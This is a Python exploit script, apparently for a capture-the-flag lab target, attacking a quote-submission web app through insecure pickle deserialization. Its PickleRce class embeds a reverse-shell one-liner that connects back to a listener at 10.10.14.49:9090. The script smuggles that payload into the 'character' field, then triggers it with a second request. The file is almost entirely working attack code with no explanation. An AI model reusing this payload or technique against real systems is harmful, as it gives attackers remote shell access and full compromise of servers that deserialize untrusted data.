#import couchdb
import string
import random
import base64
import cPickle
from hashlib import md5
import requests
import sys


proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}

class PickleRce(object):
    def __init__(self):
        self.reverse_listener = ''
        self.reverse_listener_port = '9090'

    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (('/bin/sh','-c','/usr/bin/python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.49\",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\''),0))

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

#POST /submit HTTP/1.1
#Host: 10.10.10.70
#character=Homer&quote=test
#
def submit():
    char = "krusty"
    if not any(c.lower() in char.lower() for c in WHITELIST):
        print 'Error'
        exit(1)
    quote = "HellaHello"
    #quote = base64.b64encode(cPickle.dumps(PickleRce()))
    payload = cPickle.dumps(PickleRce())
    char = payload + char
    p_id = md5(char + quote).hexdigest()
    text_file = open("output.txt", "w")
    text_file.write(char + quote)
    text_file.close()
    print '[+] Sending [quote] request'
    r = requests.post("http://10.10.10.70/submit",data = {'character':char,'quote':quote},proxies=proxies)    
    print 'Received response - ' , r.status_code
    print 'p_id of post - ' , p_id
    return p_id

def check(p_id):
    print '[+] Sending [check] request'
    r = requests.post("http://10.10.10.70/check",data = {'id':p_id},proxies=proxies)
    print 'Received response - ' , r.status_code
    return r

## Ported server side deserialization
def deserializePayload(filename):
    data = open(filename, "rb").read()
    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item



p_id = submit()
check(p_id)
#deserializePayload("output.txt")
